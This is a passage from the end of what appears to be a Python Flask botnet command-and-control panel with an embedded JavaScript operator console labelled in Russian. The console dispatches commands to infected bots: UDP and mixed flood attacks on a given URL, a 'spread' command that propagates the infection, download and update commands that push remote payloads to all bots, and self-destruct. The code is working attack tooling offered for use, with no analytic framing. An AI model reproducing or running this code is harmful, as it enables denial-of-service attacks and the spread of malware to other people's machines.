                        const udpForm = new FormData();
                        udpForm.append('bot_id', 'all');
                        udpForm.append('command', 'udp_flood');
                        udpForm.append('params', args[0]);
                        await fetch('/api/send_command', { method: 'POST', body: udpForm });
                        addConsoleLine('success', `🔥 UDP Flood запущен на ${args[0]}`);
                        break;
                        
                    case 'mix':
                        if (args.length === 0) {
                            addConsoleLine('error', '❌ Использование: mix <url>');
                            break;
                        }
                        const mixForm = new FormData();
                        mixForm.append('bot_id', 'all');
                        mixForm.append('command', 'mix_flood');
                        mixForm.append('params', args[0]);
                        await fetch('/api/send_command', { method: 'POST', body: mixForm });
                        addConsoleLine('success', `⚡ MIX ATTACK запущен на ${args[0]}`);
                        break;
                        
                    case 'info':
                        let infoTarget = 'all';
                        if (args.length > 0) infoTarget = args[0];
                        const infoForm = new FormData();
                        infoForm.append('bot_id', infoTarget);
                        infoForm.append('command', 'info');
                        infoForm.append('params', '');
                        await fetch('/api/send_command', { method: 'POST', body: infoForm });
                        addConsoleLine('success', `📊 Запрос информации отправлен ${infoTarget}`);
                        break;
                        
                    case 'kill':
                        if (args.length === 0) {
                            addConsoleLine('error', '❌ Использование: kill <бот_id>');
                            break;
                        }
                        const killForm = new FormData();
                        killForm.append('bot_id', args[0]);
                        killForm.append('command', 'selfdestruct');
                        killForm.append('params', '');
                        await fetch('/api/send_command', { method: 'POST', body: killForm });
                        addConsoleLine('success', `💀 Самоуничтожение отправлено ${args[0]}`);
                        break;
                        
                    case 'spread':
                        const spreadForm = new FormData();
                        spreadForm.append('bot_id', 'all');
                        spreadForm.append('command', 'spread');
                        spreadForm.append('params', '');
                        await fetch('/api/send_command', { method: 'POST', body: spreadForm });
                        addConsoleLine('success', '📀 Распространение запущено на всех ботах');
                        break;
                        
                    case 'download':
                        if (args.length === 0) {
                            addConsoleLine('error', '❌ Использование: download <url>');
                            break;
                        }
                        const downForm = new FormData();
                        downForm.append('bot_id', 'all');
                        downForm.append('command', 'download');
                        downForm.append('params', args[0]);
                        await fetch('/api/send_command', { method: 'POST', body: downForm });
                        addConsoleLine('success', `📥 Скачивание отправлено: ${args[0]}`);
                        break;
                        
                    case 'update':
                        if (args.length === 0) {
                            addConsoleLine('error', '❌ Использование: update <url>');
                            break;
                        }
                        const updForm = new FormData();
                        updForm.append('bot_id', 'all');
                        updForm.append('command', 'update');
                        updForm.append('params', args[0]);
                        await fetch('/api/send_command', { method: 'POST', body: updForm });
                        addConsoleLine('success', `🔄 Обновление отправлено: ${args[0]}`);
                        break;
                        
                    default:
                        addConsoleLine('error', `❌ Неизвестная команда: ${command}. Введите help`);
                }
            } catch(e) {
                addConsoleLine('error', '❌ Ошибка: ' + e.message);
            }
            refreshStats();
        }
        
        document.getElementById('consoleInput').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                executeConsoleCommand();
            }
        });
        
        // ============== ИНИЦИАЛИЗАЦИЯ ==============
        setInterval(refreshStats, 5000);
        setInterval(refreshBots, 15000);
        setInterval(refreshLogs, 5000);
        setInterval(refreshAttackStatus, 3000);
        refreshStats();
        refreshBots();
        refreshLogs();
        refreshAttackStatus();
    </script>
</body>
</html>
    '''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
